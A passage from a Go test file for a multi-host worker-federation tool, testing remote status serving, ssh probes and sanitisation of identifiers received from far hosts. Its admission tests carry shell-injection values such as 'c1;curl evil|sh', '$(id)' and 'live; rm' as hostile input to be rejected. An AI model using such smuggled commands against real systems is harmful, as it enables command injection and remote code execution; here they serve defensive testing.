	if len(inbox) != FarMaxEvents {
		t.Errorf("overseer_inbox holds %d msgs, want the %d oldest", len(inbox), FarMaxEvents)
	}
	if n := len(marshal(t, ans)); n > farMaxBytes {
		t.Errorf("the served answer is %d bytes, over the byte budget of %d", n, farMaxBytes)
	}
	if _, err := AdmitHost(marshal(t, ans), "mbp", "halo", ago(4000)); err != nil {
		t.Errorf("the served answer is refused: %v", err)
	}
}

// A far answer cut between two ts groups lowers the answer's own ts for the
// requester's floor, but the partner's clock is the status.ts the answer
// already carries: the ok partner reports that, not the cut. Its rows still
// stop at or below the next --since, so the floor re-serves the rest. On main
// finish reads the lowered answer ts, so HostStatus.TS is the cut, not the
// far clock.
func TestServeFarReportsTheFarClockNotTheCut(t *testing.T) {
	var lines []string
	for i := range FarMaxEvents {
		body := fmt.Sprintf(`"{\"kind\":\"ack\",\"n\":%d}"`, i)
		lines = append(lines, wmsg(900, "c9", "dispatcher:c9", "overseer:halo", body))
	}
	lines = append(lines, wmsg(100, "c9", "dispatcher:c9", "overseer:halo", `"{\"kind\":\"note\"}"`))
	far := farFix(t, "mbp", lines...)

	f := newStatusFix(t)
	f.overseer("halo", "mbp")
	var ans FarAnswer
	f.opts.Federate = func(ctx context.Context, _ string, argv []string, stdout, stderr io.Writer) int {
		since, err := strconv.ParseInt(argv[6], 10, 64)
		if err != nil {
			t.Errorf("--since %q: %v", argv[6], err)
			return 2
		}
		a, err := ServeFar(ctx, argv[4], since, stderr, far.opts)
		if err != nil {
			_, _ = fmt.Fprintln(stderr, err)
			return 1
		}
		ans = a
		if err := jsonval.Encode(stdout, a, false); err != nil {
			t.Error(err)
			return 1
		}
		return 0
	}

	doc := f.collect(StatusRequest{})
	if ans.TS >= ans.Status.TS {
		t.Fatalf("the fixture did not cut: answer ts %d, status ts %d", ans.TS, ans.Status.TS)
	}
	if len(doc.Hosts) != 1 || doc.Hosts[0].State != "ok" {
		t.Fatalf("hosts = %+v, want mbp ok", doc.Hosts)
	}
	h := doc.Hosts[0]
	newest := int64(0)
	for _, b := range h.Batches() {
		for _, ev := range b.Events {
			if ts, ok := watch.WholeMS(ev["ts"]); ok && ts > newest {
				newest = ts
			}
		}
	}
	if next := ans.TS - FarSettle.Milliseconds(); newest > next {
		t.Errorf("the newest served row %d is above the next --since %d", newest, next)
	}
	got := "nil"
	if h.TS != nil {
		got = strconv.FormatInt(*h.TS, 10)
	}
	if h.TS == nil || *h.TS != ans.Status.TS {
		t.Errorf("HostStatus.TS = %s, want the far clock %d", got, ans.Status.TS)
	}
}

func TestOverseerProbe(t *testing.T) {
	remoteRow := func(s int64, crew, branch, host string) string {
		return fmt.Sprintf(`{"ts":%d,"crew_id":%q,"kind":"dispatch","branch":%q,"name":"remy","host":%q,"remote":true}`, ago(s), crew, branch, host)
	}
	f := newStatusFix(t,
		remoteRow(60, "c1", "r/1", "h1"),
		remoteRow(60, "c2", "r/2", "h1"),
		remoteRow(60, "c3", "r/3", "h2"),
		remoteRow(60, "c4", "r/4", "h3"),
	)
	beta := mkRepo(t, f.root, "beta", "", remoteRow(60, "c5", "r/5", "h2"))
	if err := os.WriteFile(f.opts.Registry, []byte(f.common+"\n"+beta+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	f.overseer("halo")
	f.opts.FederateTimeout = 100 * time.Millisecond
	var calls fedCalls
	var dirs []string
	f.opts.OverseerProbe = func(dir string) roster.Capture {
		dirs = append(dirs, dir)
		return func(ctx context.Context, host string, argv []string, stdout, stderr io.Writer) int {
			calls.add(host, argv)
			switch host {
			case "h2":
				_, _ = io.WriteString(stderr, "h2 is down\nmore\n")
				return 255
			case "h3":
				<-ctx.Done()
				return 255
			}
			crew := argv[len(argv)-1]
			_, _ = fmt.Fprintf(stdout, `[{"branch":"r/%s","state":"working","live":true,"age_s":5}]`, strings.TrimPrefix(crew, "c"))
			return 0
		}
	}
	start := time.Now()
	doc := f.collect(StatusRequest{})
	if el := time.Since(start); el > 10*time.Second {
		t.Errorf("collect took %s: the probe was not cut at FederateTimeout", el)
	}
	if want := []string{filepath.Dir(f.common), filepath.Dir(beta)}; !slices.Equal(dirs, want) {
		t.Errorf("OverseerProbe dirs = %q, want %q", dirs, want)
	}
	got := calls.list()
	slices.Sort(got)
	want := []string{
		"h1: crew roster --live -- c1",
		"h1: crew roster --live -- c2",
		"h2: crew roster --live -- c3",
		"h3: crew roster --live -- c4",
	}
	if !slices.Equal(got, want) {
		t.Errorf("calls = %q, want %q (beta's h2 probe fails fast)", got, want)
	}
	for _, crew := range []string{"c1", "c2"} {
		w := doc.crew(t, crew).Workers[0]
		if w["state"] != "working" || w["remote_unprobed"] != false || w["host"] != "h1" {
			t.Errorf("%s row = %v, want probed", crew, w)
		}
	}
	for _, crew := range []string{"c3", "c5"} {
		if w := doc.crew(t, crew).Workers[0]; w["host_error"] != "ssh failed (255)" || w["remote_unprobed"] != false {
			t.Errorf("%s row = %v, want ssh's failure worded here", crew, w)
		}
	}
	if w := doc.crew(t, "c4").Workers[0]; w["host_error"] != "no answer within 100ms" {
		t.Errorf("c4 row = %v", w)
	}

	f.opts.Sender.Tmux = nil
	doc = f.collect(StatusRequest{})
	if got := calls.list(); len(got) != len(want) {
		t.Errorf("a failing sender check probed: %q", got[len(want):])
	}
	if w := doc.crew(t, "c1").Workers[0]; w["remote_unprobed"] != true {
		t.Errorf("row = %v, want the unprobed placeholder", w)
	}
}

func TestOverseerProbeRefusesOtherArgv(t *testing.T) {
	called := false
	m := &probeMemo{timeout: time.Second, failed: map[string]string{}}
	c := m.wrap(func(context.Context, string, []string, io.Writer, io.Writer) int {
		called = true
		return 0
	}, "c1")
	for _, argv := range [][]string{
		{"crew", "roster", "--live", "--", "c2"},
		{"crew", "roster", "--live", "c1"},
		{"crew", "msg", "dispatcher:c1", "x"},
		{"crew", "roster", "--live", "--", "c1", "extra"},
	} {
		var stderr bytes.Buffer
		if rc := c(t.Context(), "h1", argv, io.Discard, &stderr); rc != 1 || stderr.Len() == 0 {
			t.Errorf("%q: rc=%d stderr=%q, want a refusal", argv, rc, stderr.String())
		}
	}
	if called {
		t.Error("a refused argv reached the probe")
	}
}

func TestGuestCrews(t *testing.T) {
	f := newStatusFix(t,
		wstatus(100, "c9", "feat/z", "working", ""),
		wstatus(100, "c8", "feat/y", "done", ""),
		wstatus(100, "c7", "feat/x", "working", ""),
		wstatus(100, "c6", "feat/w", "working", ""),
	)
	f.opts.Host = func() (string, error) { return "mbp", nil }
	f.windows("feat/z", "feat/x", "feat/w")
	f.tmux.Out[stampFormat] = "c9\x1fhalo\nc7\x1fmbp\nc6\x1fhalo\n"
	f.pidfile("c6", "101")
	doc := f.collect(StatusRequest{})

	c9 := doc.crew(t, "c9")
	if c9.Attention != "guest" || c9.Dispatcher.Home == nil || *c9.Dispatcher.Home != "halo" {
		t.Errorf("c9 = %+v home %v, want guest of halo", c9, c9.Dispatcher.Home)
	}
	if c8 := doc.crew(t, "c8"); c8.Attention != "idle" || c8.Dispatcher.Home != nil {
		t.Errorf("c8 = %+v, want idle with no home", c8)
	}
	if c7 := doc.crew(t, "c7"); c7.Attention != "unattended" || c7.Dispatcher.Home != nil {
		t.Errorf("c7 (stamped with this host) = %+v, want unattended", c7)
	}
	if c6 := doc.crew(t, "c6"); c6.Attention != "unattended" || c6.Dispatcher.Home != nil {
		t.Errorf("c6 (a dead registration) = %+v, want unattended", c6)
	}
	raw := marshal(t, doc.crew(t, "c8").Dispatcher)
	if !strings.Contains(string(raw), `"home":null`) {
		t.Errorf("dispatcher json = %s", raw)
	}
}

// One owner per worker: the home crew on halo holds the --host worker as a
// remote row, mbp's guest crew holds its real status rows.
func TestFederateDedupFixture(t *testing.T) {
	far := farFix(t, "mbp",
		wstatus(400, "c1", "r/1", "blocked", `,"detail":"waiting (cycle 2 of 24)"`),
	)
	far.windows("r/1")
	far.tmux.Out[stampFormat] = "c1\x1fhalo\n"
	f := newStatusFix(t,
		fmt.Sprintf(`{"ts":%d,"crew_id":"c1","kind":"dispatch","branch":"r/1","name":"remy","host":"mbp","remote":true}`, ago(500)),
	)
	f.pidfile("c1", "100")
	f.overseer("halo", "mbp")
	var calls fedCalls
	f.opts.Federate = calls.serve(t, far)
	doc := f.collect(StatusRequest{})

	home := doc.crew(t, "c1")
	if home.Attention != "attended" || len(home.Workers) != 1 {
		t.Fatalf("home crew = %+v", home)
	}
	if w := home.Workers[0]; w["host"] != "mbp" || w["remote_unprobed"] != true || w["blocked"] != nil {
		t.Errorf("home row = %v, want mbp's placeholder with no worker-level state", w)
	}
	if doc.Repos[0].Host != "halo" {
		t.Errorf("home repo host = %q", doc.Repos[0].Host)
	}
	h := doc.Hosts[0]
	if h.State != "ok" || len(h.Repos) != 1 || h.Repos[0].Host != "mbp" {
		t.Fatalf("mbp = %+v", h)
	}
	guest := h.Repos[0].Crews[0]
	if guest.CrewID != "c1" || guest.Attention != "guest" || guest.Dispatcher.Home == nil || *guest.Dispatcher.Home != "halo" {
		t.Errorf("guest crew = %+v", guest)
	}
	if len(guest.Workers) != 1 {
		t.Fatalf("guest workers = %v", guest.Workers)
	}
	w := guest.Workers[0]
	if _, has := w["host"]; has || w["state"] != "blocked" || w["blocked"] == nil {
		t.Errorf("guest row = %v, want the local blocked row", w)
	}
}

// shellish are the characters no far identifier may carry into a status
// document or a lane line.
const shellish = "$(;` |"

func TestAdmitHostRestrictsFarIdentifiers(t *testing.T) {
	const evil = "c1;curl evil|sh"
	a := farAnswer(
		farEvent(ago(30), "c9", "dispatcher:c9", "overseer:halo", "{}"),
		farEvent(ago(29), evil, "dispatcher:"+evil, "overseer:halo", "{}"),
	)
	status := a["status"].(map[string]any)
	repo := status["repos"].([]any)[0].(map[string]any)
	bad := maps.Clone(repo)
	bad["repo"], bad["common"] = "a/b$(id)", "/git/a b;`x`/.git"
	status["repos"] = append(status["repos"].([]any), bad)
	good := repo["crews"].([]any)[0].(map[string]any)
	good["workers"] = []any{
		map[string]any{"branch": "feat/$(id)", "state": "working"},
		map[string]any{"branch": "feat/y", "from": "worker:x;y", "state": "working"},
		map[string]any{"branch": "feat/n", "name": "n m`", "state": "working"},
	}
	crewWith := func(id string, edit func(c, d map[string]any)) map[string]any {
		d := map[string]any{"state": "dead", "pid": nil, "pane": nil, "lane": nil, "last_event_s": nil, "home": nil}
		c := map[string]any{"crew_id": id, "attention": "idle", "workers": []any{}, "holds": []any{}, "overseer_inbox": []any{}, "dispatcher": d}
		edit(c, d)
		return c
	}
	repo["crews"] = []any{good,
		crewWith(evil, func(_, _ map[string]any) {}),
		crewWith("c2", func(_, d map[string]any) { d["state"] = "live; rm" }),
		crewWith("c3", func(_, d map[string]any) { d["lane"] = "alive$(x)" }),
		crewWith("c4", func(c, _ map[string]any) { c["attention"] = "x y" }),
		crewWith("c5", func(_, d map[string]any) { d["lane"] = "stale" }),
	}
	status["queue"] = map[string]any{
		"head": map[string]any{"repo": "a/b", "crew_id": "c9", "id": "h 1;x", "waited_s": 5},
		"demoted": []any{
			map[string]any{"repo": "a/b", "crew_id": evil, "id": "1700000000000-1", "first_due": 1, "demoted_at": 2},
			map[string]any{"repo": "a/b", "crew_id": "c9", "id": "1700000000000-2", "first_due": 1, "demoted_at": 2},
		},
		"parked": []any{
			map[string]any{"repo": "r(", "crew_id": "c9", "id": "1700000000000-3", "reason": "demoted"},
			map[string]any{"repo": "a/b", "crew_id": "c9", "id": "i`d", "reason": "demoted"},
			map[string]any{"repo": "a/b", "crew_id": "c9", "id": "1700000000000-4", "reason": "x y"},
			map[string]any{"repo": "a/b", "crew_id": "c9", "id": "1700000000000-5", "reason": "demoted"},
		},
	}
	a["inbox"] = append(a["inbox"].([]any), map[string]any{"repo": "a/b$(id)", "common": "/x y$(z)", "cursor": ago(10),
		"events": []any{farEvent(ago(28), "c9", "dispatcher:c9", "overseer:halo", "{}")}})
	a["misrouted"] = []any{
		map[string]any{"repo": "a/b", "common": "/x/y", "crew_id": evil, "from": "worker:a", "ts": ago(40)},
		map[string]any{"repo": "a/b", "common": "/x/y", "crew_id": "c9", "from": "worker:$(id)", "ts": ago(41)},
		map[string]any{"repo": "a/b$(id)", "common": "/x/y", "crew_id": "c9", "from": "worker:a", "ts": ago(42)},
		map[string]any{"repo": "a/b", "common": "/x/y", "crew_id": "c9", "from": "worker:a", "ts": ago(43)},
	}

	ans, err := AdmitHost(marshal(t, a), "mbp", "halo", 0)
	if err != nil {
		t.Fatal(err)
	}
	if len(ans.Status.Repos) != 2 || ans.Status.Repos[1].Repo != "" || ans.Status.Repos[1].Common != "" {
		t.Fatalf("repos = %+v, want the repo with an invalid label kept unlabeled, its common dir unshown", ans.Status.Repos)
	}
	var ids []string
	for _, c := range ans.Status.Repos[0].Crews {
		ids = append(ids, c.CrewID)
	}
	if !slices.Equal(ids, []string{"c9", "c5"}) {
		t.Errorf("crews = %q, want only c9 and c5: an invalid id, state, lane or attention drops the crew", ids)
	}
	if w := ans.Status.Repos[0].Crews[0].Workers; len(w) != 1 || w[0]["branch"] != "feat/n" || w[0]["name"] != nil {
		t.Errorf("c9 workers = %v, want only feat/n, its name dropped: an invalid branch or sender drops the row", w)
	}
	// Both repos hold c9, each with two worker rows that do not hold; the three
	// far commons are the unlabeled repos.
	if sk := ans.Status.Skipped; len(sk) != 7 || sk[6].Status != "4 repo(s) with an invalid label shown unlabeled" {
		t.Errorf("skipped = %+v, want the 4 dropped crews, 2 worker-row counts and the unlabeled count", sk)
	}
	if len(ans.Inbox) != 2 || len(ans.Inbox[0].Events) != 1 || ans.Inbox[0].Events[0]["crew_id"] != "c9" || ans.Inbox[1].Repo != "" {
		t.Errorf("inbox = %+v, want c9's reply in each batch, the second unlabeled", ans.Inbox)
	}
	if m := ans.Misrouted; len(m) != 2 || m[0].TS != ago(42) || m[0].Repo != "" || m[1].TS != ago(43) {
		t.Errorf("misrouted = %+v, want the unlabeled and the valid one: an invalid crew id or sender drops it", m)
	}
	q := ans.Status.Queue
	if q.Head != nil || len(q.Demoted) != 1 || q.Demoted[0].ID != "1700000000000-2" ||
		len(q.Parked) != 2 || q.Parked[0].Repo != "" || q.Parked[1].ID != "1700000000000-5" {
		t.Errorf("queue = %+v, want the head and the evil demotion dropped, the unlabeled parked entry kept", q)
	}
	// A far common dir is a key only, never shown: the rest must hold.
	for i := range ans.Inbox {
		ans.Inbox[i].Common = ""
	}
	for i := range ans.Misrouted {
		ans.Misrouted[i].Common = ""
	}
	for _, part := range []any{ans.Status.Repos, ans.Status.Queue, ans.Misrouted, ans.Inbox} {
		raw := marshal(t, part)
		if i := bytes.IndexAny(raw, shellish); i >= 0 {
			t.Errorf("%q survived admission in %s", raw[i], raw)
		}
	}
}

func TestFederateSinceIsTheInboxFloor(t *testing.T) {
	far := farFix(t, "mbp")
	for _, tc := range []struct {
		name      string
		inbox     string
		since     int64
		hostSince func(host string) (int64, bool)
	}{
		{name: "no inbox", since: nowMS() - 24*3600*1000},
		{name: "a torn inbox", inbox: `{"floor":`, since: nowMS() - 24*3600*1000},
		{name: "the floor", inbox: fmt.Sprintf(`{"floor":%d,"seen":["k"]}`, ago(300)), since: ago(300)},
		// The lane's in-memory floor wins over the file's: the pull asks from
		// the hook even when the file holds an older floor.
		{
			name:  "the lane's floor above the file's",
			inbox: fmt.Sprintf(`{"floor":%d,"seen":["k"]}`, ago(300)),
			since: ago(100),
			hostSince: func(string) (int64, bool) {
				return ago(100), true
			},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newStatusFix(t)
			f.overseer("halo", "mbp")
			f.opts.HostSince = tc.hostSince
			if tc.inbox != "" {
				path := lane.OverseerHostInbox(f.env["XDG_STATE_HOME"], "mbp")
				if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(path, []byte(tc.inbox), 0o644); err != nil {
					t.Fatal(err)
				}
			}
			var calls fedCalls
			f.opts.Federate = calls.serve(t, far)
			f.collect(StatusRequest{})
			want := []string{fmt.Sprintf("mbp: crew overseer status --origin halo --since %d", tc.since)}
			if got := calls.list(); !slices.Equal(got, want) {
				t.Errorf("calls = %q, want %q", got, want)
			}
		})
	}
}

func TestServeFarNamesEachBusCommon(t *testing.T) {
	far := farFix(t, "mbp",
		wmsg(200, "c9", "dispatcher:c9", "overseer:halo", `{"kind":"note"}`),
		wmsg(100, "c9", "worker:feat/z#s1-1", "overseer:halo", `{"kind":"ack"}`),
	)
	ans, err := ServeFar(t.Context(), "halo", ago(250), io.Discard, far.opts)
	if err != nil {
		t.Fatal(err)
	}
	if len(ans.Inbox) != 1 || ans.Inbox[0].Common != far.common {
		t.Errorf("inbox = %+v, want common %s", ans.Inbox, far.common)
	}
	if len(ans.Misrouted) != 1 || ans.Misrouted[0].Common != far.common {
		t.Errorf("misrouted = %+v, want common %s", ans.Misrouted, far.common)
	}
}

func TestFederateDemotesGuestsWithNoReachableHome(t *testing.T) {
	far := farFix(t, "mbp",
		wstatus(100, "f1", "far/1", "working", ""),
		wstatus(100, "f2", "far/2", "working", ""),
	)
	far.windows("far/1", "far/2")
	far.tmux.Out[stampFormat] = "f1\x1fhalo\nf2\x1fzed\n"
	f := newStatusFix(t,
		wstatus(100, "g1", "loc/1", "working", ""),
		wstatus(100, "g2", "loc/2", "working", ""),
		wstatus(100, "g3", "loc/3", "working", ""),
	)
	f.windows("loc/1", "loc/2", "loc/3")
	f.tmux.Out[stampFormat] = "g1\x1fmbp\ng2\x1fzed\ng3\x1fqux\n"
	f.overseer("halo", "mbp", "zed")
	var calls fedCalls
	serve := calls.serve(t, far)
	f.opts.Federate = func(ctx context.Context, host string, argv []string, stdout, stderr io.Writer) int {
		if host == "zed" {
			_, _ = io.WriteString(stderr, "ssh: zed: refused\n")
			return 255
		}
		return serve(ctx, host, argv, stdout, stderr)
	}
	doc := f.collect(StatusRequest{})
	for _, tc := range []struct {
		c          CrewStatus
		attn, home string
	}{
		{doc.crew(t, "g1"), "guest", "mbp"},
		{doc.crew(t, "g2"), "unattended", "zed"},
		{doc.crew(t, "g3"), "unattended", "qux"},
		{doc.Hosts[0].Repos[0].Crews[0], "guest", "halo"},
		{doc.Hosts[0].Repos[0].Crews[1], "unattended", "zed"},
	} {
		if tc.c.Attention != tc.attn || tc.c.Dispatcher.Home == nil || *tc.c.Dispatcher.Home != tc.home {
			t.Errorf("%s = %s home %v, want %s with home %s kept", tc.c.CrewID, tc.c.Attention, tc.c.Dispatcher.Home, tc.attn, tc.home)
		}
	}
}

func TestFederateUnreadableHostsListsKnownPartners(t *testing.T) {
	f := newStatusFix(t)
	f.overseer("halo", "mbp")
	f.opts.Sender.Hosts = func() (map[string]remote.Host, error) { return nil, errors.New("settings.json: \x1b[31mbad\x7f") }
	if err := WriteOK(f.hostDir("mbp"), ago(3600)); err != nil {
		t.Fatal(err)
	}
	for _, dir := range []string{f.hostDir("zed"), f.hostDir("halo"), f.hostDir("-bad")} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	var calls fedCalls
	f.opts.Federate = func(_ context.Context, host string, argv []string, _, _ io.Writer) int {
		calls.add(host, argv)
		return 0
	}
	doc := f.collect(StatusRequest{})
	if got := calls.list(); len(got) != 0 {
		t.Errorf("unreadable hosts federated: %q", got)
	}
	if len(doc.Hosts) != 2 || doc.Hosts[0].Host != "mbp" || doc.Hosts[1].Host != "zed" {
		t.Fatalf("hosts = %+v, want mbp and zed from their state dirs", doc.Hosts)
	}
	want := "settings hosts cannot be read (settings.json: [31mbad)"
	for _, h := range doc.Hosts {
		if h.State != "unprobed" || h.Error == nil || *h.Error != want {
			t.Errorf("%s = %s error %v, want unprobed with %q", h.Host, h.State, h.Error, want)
		}
	}
	if h := doc.Hosts[0]; h.LastOkTS == nil || *h.LastOkTS != ago(3600) || h.AgeS == nil || *h.AgeS != 3600 {
		t.Errorf("mbp last_ok_ts/age_s = %v/%v, want %d/3600", h.LastOkTS, h.AgeS, ago(3600))
	}
	if h := doc.Hosts[1]; h.LastOkTS != nil || h.AgeS != nil {
		t.Errorf("zed last_ok_ts/age_s = %v/%v, want null", h.LastOkTS, h.AgeS)
	}
}

// A probe's far stderr is never kept: its failure line is worded here.
func TestOverseerProbeStderrIsNotRead(t *testing.T) {
	m := &probeMemo{timeout: time.Second, failed: map[string]string{}}
	held := false
	far := func(_ context.Context, _ string, _ []string, _, stderr io.Writer) int {
		_, _ = io.WriteString(stderr, "far: $(id) refused\n")
		_, held = stderr.(interface{ String() string })
		return 1
	}
	var stderr bytes.Buffer
	rc := m.wrap(far, "c1")(t.Context(), "h1", []string{"crew", "roster", "--live", "--", "c1"}, io.Discard, &stderr)
	if rc != 1 || held || stderr.String() != "exit status 1\n" {
		t.Errorf("rc = %d held = %v stderr = %q, want 1, nothing held and the exit status", rc, held, stderr.String())
	}
}

func TestOverseerProbeMemoizesOnlyTransportFailures(t *testing.T) {
	m := &probeMemo{timeout: time.Second, failed: map[string]string{}}
	argv := func(crew string) []string { return []string{"crew", "roster", "--live", "--", crew} }
	var calls []string
	capture := func(rc int, line string) roster.Capture {
		return func(_ context.Context, host string, argv []string, stdout, stderr io.Writer) int {
			calls = append(calls, host+" "+argv[len(argv)-1])
			_, _ = io.WriteString(stdout, "[]")
			_, _ = io.WriteString(stderr, line+"\n")
			return rc
		}
	}
	if rc := m.wrap(capture(2, "alpha is not a clone of acme/alpha"), "c1")(t.Context(), "h1", argv("c1"), io.Discard, io.Discard); rc != 2 {
		t.Errorf("alpha rc = %d", rc)
	}
	if rc := m.wrap(capture(0, ""), "c2")(t.Context(), "h1", argv("c2"), io.Discard, io.Discard); rc != 0 {
		t.Errorf("beta rc = %d, want its own probe's answer", rc)
	}
	if rc := m.wrap(capture(255, "ssh: h2: refused"), "c3")(t.Context(), "h2", argv("c3"), io.Discard, io.Discard); rc != 255 {
		t.Errorf("h2 rc = %d", rc)
	}
	var stderr bytes.Buffer
	if rc := m.wrap(capture(0, ""), "c4")(t.Context(), "h2", argv("c4"), io.Discard, &stderr); rc == 0 || stderr.String() != "ssh failed (255)\n" {
		t.Errorf("after ssh's 255: rc = %d stderr %q, want a fast failure", rc, stderr.String())
	}
	if want := []string{"h1 c1", "h1 c2", "h2 c3"}; !slices.Equal(calls, want) {
		t.Errorf("calls = %q, want %q", calls, want)
	}
}

// poison is what each far string becomes in TestAdmitHostPoisonEveryLeaf:
// shell, glob and line-breaking characters around the letters x, i and d, so
// a rewrite that strips them leaves "xid".
const poison = "x;$(id)`|&<>'\"*? \n"

// farTextPaths are the only far strings admission copies as text.
var farTextPaths = []string{"status.skipped[].status", "inbox[].events[].body"}

// farKeyPaths are the far common dirs admission keeps as they are, as keys
// only: never validated, never shown.
var farKeyPaths = []string{"inbox[].common", "misrouted[].common"}

// farLabelPaths are the far repo labels: an invalid one is withheld, its
// element kept and counted in a skipped note.
var farLabelPaths = []string{"status.repos[].repo", "inbox[].repo", "misrouted[].repo",
	"status.queue.head.repo", "status.queue.demoted[].repo", "status.queue.parked[].repo"}

var farIdentRE = regexp.MustCompile(`^[A-Za-z0-9:/#._@-]*$`)

// keyedPaths are the far objects whose keys are data, not field names.
var keyedPaths = []string{"status.machine.engines"}

// norm is a concrete leaf path as its type names it: a list index is [], a
// key of a keyed object {}.
func norm(path string) string {
	out := ""
	for seg := range strings.SplitSeq(path, ".") {
		switch {
		case seg != "" && strings.Trim(seg, "0123456789") == "":
			out += "[]"
		case slices.Contains(keyedPaths, out):
			out += "{}"
		case out == "":
			out = seg
		default:
			out += "." + seg
		}
	}
	return out
}

// typeLeaves adds the path of every string field t holds, by json tag, to out;
// with have, only those v carries. A row typed map[string]any is poisoned
// value by value instead, and a far status's hosts are never read.
func typeLeaves(t reflect.Type, v any, have bool, path string, out map[string]bool) {
	switch t.Kind() {
	case reflect.Pointer:
		typeLeaves(t.Elem(), v, have, path, out)
	case reflect.String:
		if _, ok := v.(string); ok || !have {
			out[path] = true
		}
	case reflect.Interface:
		// Any value at all: whatever strings it holds, the fixture must carry it.
		if v != nil || !have {
			out[path] = true
		}
	case reflect.Invalid, reflect.Bool, reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64,
		reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Uintptr,
		reflect.Float32, reflect.Float64, reflect.Complex64, reflect.Complex128, reflect.Chan, reflect.Func, reflect.UnsafePointer:
	case reflect.Slice, reflect.Array:
		list, _ := v.([]any)
		if !have {
			list = []any{nil}
		}
		for _, e := range list {
			typeLeaves(t.Elem(), e, have, path+"[]", out)
		}
	case reflect.Map:
		if t.Elem().Kind() == reflect.Interface {
			return
		}
		m, _ := v.(map[string]any)
		if !have {
			m = map[string]any{"": nil}
		}
		for _, e := range m {
			out[path+"{key}"] = true
			typeLeaves(t.Elem(), e, have, path+"{}", out)
		}
	case reflect.Struct:
		m, _ := v.(map[string]any)
		for f := range t.Fields() {
			name, _, _ := strings.Cut(f.Tag.Get("json"), ",")
			p := strings.TrimPrefix(path+"."+name, ".")
			if name == "" || name == "-" || p == "status.hosts" {
				continue
			}
			if e, ok := m[name]; ok || !have {
				typeLeaves(f.Type, e, have, p, out)
			}
		}
	}
}

// walkStrings visits every string of a decoded JSON value, and every key of a
// keyed object as path#key, in a stable order, with a setter for it.
func walkStrings(v any, path string, visit func(path, s string, set func(string))) {
	join := func(seg string) string { return strings.TrimPrefix(path+"."+seg, ".") }
	switch x := v.(type) {
	case map[string]any:
		keyed := slices.Contains(keyedPaths, norm(path))
		for _, k := range slices.Sorted(maps.Keys(x)) {
			p := join(k)
			if keyed {
				visit(p+"#key", k, func(n string) { x[n] = x[k]; delete(x, k) })
			}
			if s, ok := x[k].(string); ok {
				visit(p, s, func(n string) { x[k] = n })
				continue
			}
			walkStrings(x[k], p, visit)
		}
	case []any:
		for i, e := range x {
			p := join(strconv.Itoa(i))
			if s, ok := e.(string); ok {
				visit(p, s, func(n string) { x[i] = n })
				continue
			}
			walkStrings(e, p, visit)
		}
	}
}

func decoded(t *testing.T, v any) map[string]any {
	t.Helper()
	var out map[string]any
	if err := decodeNumbers(marshal(t, v), &out); err != nil {
		t.Fatal(err)
	}
	return out
}

// maximalFar is a far answer from mbp for halo built by ServeFar, carrying
// every string a FarAnswer can: a live dispatcher with a pid file, a pane and
// a lane, quota and fleet holds (head, demoted, parked), a working, a blocked
// and a remote-host worker, a guest crew, engines with a hot window, a
// skipped repo, an inbox reply and a misrouted msg. A lead, and an unknown key
// on each worker and event, are added to the encoded answer.
func maximalFar(t *testing.T) map[string]any {
	t.Helper()
	hold := func(agoS int64, crew, id string, weight int) string {
		return fleetAddRow(ago(agoS), crew, id, "feat/"+id, "normal", weight)
	}
	far := farFix(t, "mbp",
		hold(900, "c1", "1700000000001-1", 2),
		hold(800, "c1", "1700000000002-1", 1),
		hold(700, "c1", "1700000000003-1", 9),
		wmsg(600, "c1", "dispatcher:c1", "hold:c1",
			fmt.Sprintf(`"{\"id\":\"1700000000004-1\",\"wait\":{\"engine\":\"claude\",\"window\":\"five_hour\",\"resets_at\":%d},\"task\":{}}"`, nowS+3600)),
		wstatus(500, "c1", "feat/w", "working", ""),
		wstatus(400, "c1", "feat/b", "blocked", `,"detail":"waiting (cycle 2 of 24)"`),
		fmt.Sprintf(`{"ts":%d,"crew_id":"c1","kind":"dispatch","branch":"r/1","name":"remy","host":"h3","remote":true}`, ago(300)),
		wstatus(300, "c2", "g/1", "working", ""),
		wmsg(200, "c1", "dispatcher:c1", "overseer:halo", `"{\"kind\":\"ack\",\"re\":7}"`),
		wmsg(100, "c1", "worker:feat/w#s1-1", "overseer:halo", `"hi"`),
	)
	far.pidfile("c1", "100")
	far.crewFile("c1", "pane", "%81\n")
	far.crewFile("c1", "stream.lock.d/pid", "100\n")
	far.crewFile("c1", "stream.tick", fmt.Sprintf(`{"pid":100,"ts":%d,"park":300}`, ago(10)))
	far.windows("feat/w", "feat/b", "g/1")
	far.tmux.Out[stampFormat] = "c2\x1fhalo\n"
	gone := filepath.Join(far.root, "gone", ".git")
	if err := os.WriteFile(far.opts.Registry, []byte(far.common+"\n"+gone+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	record := filepath.Join(far.env["XDG_STATE_HOME"], "crew", "fleet-due.json")
	if err := os.MkdirAll(filepath.Dir(record), 0o755); err != nil {
		t.Fatal(err)
	}
	rec := marshal(t, dueDoc(map[holdKey]dueEntry{{far.common, "c1", "1700000000002-1"}: {Demoted: ago(300)}}))
	if err := os.WriteFile(record, rec, 0o644); err != nil {
		t.Fatal(err)
	}
	cache := fmt.Sprintf(`{"fetched_epoch":%d,"engines":{"claude":{"windows":{"5h":{"used_pct":99,"resets_at":%d}},"limit_reached":null}}}`, nowS-60, nowS+100)
	if err := os.WriteFile(far.opts.BudgetFile, []byte(cache), 0o644); err != nil {
		t.Fatal(err)
	}
	ans, err := ServeFar(t.Context(), "halo", ago(1000), io.Discard, far.opts)
	if err != nil {
		t.Fatal(err)
	}
	a := decoded(t, ans)
	status := a["status"].(map[string]any)
	status["machine"].(map[string]any)["leads"] = []any{
		map[string]any{"repo": "alpha", "branch": "feat/w", "name": "remy", "tier": "standard", "weight": 2},
	}
	for _, r := range status["repos"].([]any) {
		for _, c := range r.(map[string]any)["crews"].([]any) {
			for _, w := range c.(map[string]any)["workers"].([]any) {
				w.(map[string]any)["zz_extra"] = "kept nowhere"
			}
		}
	}
	for _, b := range a["inbox"].([]any) {
		for _, e := range b.(map[string]any)["events"].([]any) {
			e.(map[string]any)["zz_extra"] = "kept nowhere"
		}
	}
	return a
}

// projectedWorkerKeys are the keys a far worker row may keep.
var projectedWorkerKeys = []string{
